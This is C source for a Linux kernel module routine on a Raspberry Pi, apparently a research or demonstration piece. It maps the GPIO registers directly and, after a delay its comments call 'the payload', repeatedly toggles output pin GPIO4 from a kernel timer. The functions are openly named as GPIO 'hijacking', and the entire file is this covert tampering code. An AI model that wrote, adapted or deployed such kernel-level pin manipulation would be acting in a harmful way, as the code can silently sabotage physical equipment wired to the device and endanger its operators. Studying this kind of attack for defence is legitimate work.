#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/gpio.h>
#include <asm/io.h>
#include <mach/platform.h>
#include <linux/timer.h>	// for timer
#include <linux/err.h>		// for displaying error (debugging)

#define PIN_NUM 4 // GPIO4
#define BCM2708_PERI_BASE 0x20000000
#define GPIO_BASE               (BCM2708_PERI_BASE + 0x200000)	// GPIO controller

struct GpioRegisters
{
	uint32_t GPFSEL[6];
    uint32_t Reserved1;
    uint32_t GPSET[2];
    uint32_t Reserved2;
    uint32_t GPCLR[2];
	uint32_t Reserved3;
	uint32_t GPLEV[2];
}; 

struct GpioRegisters *s_pGpioRegisters;

// for timer
static struct timer_list s_CronTimer;
static int s_CronDelay = 3000;	// delay the payload for 3 seconds (implying a 30 minutes of wait)
static int s_CronPeriod = 2000;	// do cron job every 2 second

int CheckGPIOIsOutput(int GPIO){
	int registerIndex = GPIO / 10;
    int bit = (GPIO % 10) * 3;
	unsigned oldValue = s_pGpioRegisters->GPFSEL[registerIndex];// e.g. GPIO4 is in GPFSEL[0] => base address register (32-bit)	
	unsigned oldFunctionCode = (oldValue >> bit) & 0b111;		// old value of function code
	
	if(oldFunctionCode == 0b001)	// if this GPIO is set as an output
		return 1;
	else
		return 0;
}

static void ChangeGPIOFuntion(int GPIO, int functionCode)
{
	int registerIndex = GPIO / 10;
    int bit = (GPIO % 10) * 3;
	unsigned oldValue = s_pGpioRegisters->GPFSEL[registerIndex];// e.g. GPIO4 is in GPFSEL[0] => base address register (32-bit)
	unsigned oldFunctionCode = (oldValue >> bit) & 0b111;		// old value of function code
	//unsigned outputValueMask = 1 << (GPIO % 32);				// old (current) set value (no effect if this GPIO is set as an input)

	if(oldFunctionCode == 0b001)	// if this GPIO is set as an output
	{
		unsigned oldGPLEVValue = s_pGpioRegisters->GPLEV[GPIO / 32];

		//s_pGpioRegisters->GPCLR[GPIO / 32] = (1 << (GPIO % 32));
		//printk("\nGPLEV...%x\n", ((oldGPLEVValue >> (GPIO % 32)) & 1));

		if( ((oldGPLEVValue >> (GPIO % 32)) & 1) == 0 )		// if GPIO value is set to LOW (0)
		{
			//blink it;
			s_pGpioRegisters->GPSET[GPIO / 32] = (1 << (GPIO % 32));
			printk("\nsetting 1 to output...\n");
		}
		else if( ((oldGPLEVValue >> (GPIO % 32)) & 1) == 1 )	// if GPIO value is set to HIGH (1)
		{
			s_pGpioRegisters->GPCLR[GPIO / 32] = (1 << (GPIO % 32));
			printk("\nsetting 0 to output...\n");
		}
		oldGPLEVValue = s_pGpioRegisters->GPLEV[GPIO / 32];
		printk("\nGPLEV2...%x\n", ((oldGPLEVValue >> (GPIO % 32)) & 1));
	}
}

static void CronTimerHandler(unsigned long unused)
{
	ChangeGPIOFuntion(4, 0b001);
	mod_timer(&s_CronTimer, jiffies + msecs_to_jiffies(s_CronPeriod));
}

void init_gpio_hijacking(void)
{
	int result, i=0;
	printk("\nInitializing GPIO hijacking...\n");

	s_pGpioRegisters = (struct GpioRegisters *)__io_address(GPIO_BASE);
	setup_timer(&s_CronTimer, CronTimerHandler, 0);
	
	if(i==0)
		i++;
	else
		s_CronDelay = 0;
	result = mod_timer(&s_CronTimer, jiffies + msecs_to_jiffies(s_CronPeriod) + msecs_to_jiffies(s_CronDelay));
	BUG_ON(result < 0);
	//SetGPIOFunction(PIN_NUM, 0b001);
	//SetGPIOOutputValue(PIN_NUM, true);
	/*if(gpio_is_valid(PIN_NUM))
	{
		printk("\nValue of GPIO4: %d\n", gpio_get_value(PIN_NUM));
	}
*/
	printk("\nInside init func...2\n");
}

void finalize_gpio_hijacking(void)
{
	printk("Deleting timer...\n");
	del_timer(&s_CronTimer);
	printk(KERN_NOTICE "Goodbye222\n");
}
